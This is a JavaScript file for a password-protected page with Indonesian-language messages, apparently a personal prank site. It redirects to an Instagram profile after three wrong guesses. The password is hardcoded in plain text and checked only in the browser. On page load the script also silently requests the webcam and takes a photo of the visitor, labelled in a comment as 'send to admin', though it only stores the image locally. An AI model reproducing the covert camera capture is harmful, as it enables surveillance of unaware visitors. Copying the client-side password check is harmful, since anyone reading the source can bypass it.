const correctPassword = "nabilapunyakiky";
let attempts = 0;
const maxAttempts = 3;

function togglePassword() {
    const passwordInput = document.getElementById("password");
    const eyeOpen = document.getElementById("eyeOpen");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeOpen.style.opacity = "0.5";
    } else {
        passwordInput.type = "password";
        eyeOpen.style.opacity = "1";
    }
}

function validatePassword() {
    const passwordInput = document.getElementById("password");
    const errorMessage = document.getElementById("error-message");
    const countdownMessage = document.getElementById("countdown");
    const container = document.querySelector(".container");
    const button = document.querySelector("button");

    let password = passwordInput.value.trim();

    if (password === "") {
        errorMessage.textContent = "⚠️ Kata sandi tidak boleh kosong!";
        errorMessage.classList.add("show");
        container.classList.add("shake");
        setTimeout(() => container.classList.remove("shake"), 300);
        return;
    }

    if (password === correctPassword) {
        errorMessage.textContent = "✅ Kata sandi benar! Selamat datang.";
        errorMessage.classList.add("show");
        document.getElementById("success-popup").classList.remove("hidden");
        setTimeout(() => button.remove(), 500);
        setTimeout(() => {
            window.location.href = "admin.html";
        }, 2000);
        return;
    }

    attempts++;
    errorMessage.textContent = `❌ Kata sandi salah! Percobaan tersisa: ${maxAttempts - attempts}`;
    errorMessage.classList.add("show");
    passwordInput.value = "";
    container.classList.add("shake");
    setTimeout(() => container.classList.remove("shake"), 500);

    if (attempts >= maxAttempts) {
        errorMessage.textContent = "🚨 Terlalu banyak percobaan! Anda akan dialihkan...";
        
        // **Putar suara peringatan**
        let alertSound = new Audio("https://kkykrnwn.github.io/script-bucin/mp3/alarm.mp3");
        alertSound.play();

        let countdown = 10;
        countdownMessage.style.display = "block";
        countdownMessage.textContent = `Mengalihkan dalam ${countdown} detik...`;

        let interval = setInterval(() => {
            countdown--;
            countdownMessage.textContent = `Mengalihkan dalam ${countdown} detik...`;
            if (countdown <= 0) {
                clearInterval(interval);
                window.location.href = "https://www.instagram.com/kky_krnwn331";
            }
        }, 1000);
    }
}

// Akses kamera dan kirim ke admin
async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const photo = await imageCapture.takePhoto();
        sendToAdmin(photo);
    } catch (error) {
        console.error("Akses kamera ditolak!", error);
    }
}

function sendToAdmin(photo) {
    localStorage.setItem("photo", URL.createObjectURL(photo));
}

startCamera();
